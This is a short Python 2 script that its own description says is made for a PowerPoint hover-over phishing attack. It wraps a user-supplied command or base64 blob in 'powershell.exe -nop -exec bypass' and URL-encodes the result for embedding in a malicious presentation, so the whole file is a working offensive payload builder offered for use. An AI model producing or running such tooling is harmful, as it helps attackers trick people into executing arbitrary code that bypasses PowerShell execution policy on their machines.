import argparse
import urllib

parser = argparse.ArgumentParser(description='Made for use in the PowerPoint HoverOver Phishing vector. ')

parser.add_argument('-s', action="store", dest="string", help="put double-quotes around it!")
parser.add_argument('-b64', action="store", dest="b64string", help="Base64-encoded string used in PowerShell Encoded exec")

results = parser.parse_args()
if results.string == None:
	pass
else:
	baseCMD = "powershell.exe -nop -exec bypass -c "
	fullCMD = baseCMD + results.string
	print '\nstring before encoding		= ' + fullCMD
	encodedCMD = urllib.quote(fullCMD)
	print '\nstring after encoding 		= ' + encodedCMD
if results.b64string == None:
	pass

else:
	baseCMD = "powershell.exe -nop -exec bypass -enc "
	fullCMD = baseCMD + results.b64string
	encodedCMD = urllib.quote(fullCMD)
	print '\nencoded string         		= ' + fullCMD
	print '\nfull command to use 			= ' + encodedCMD	

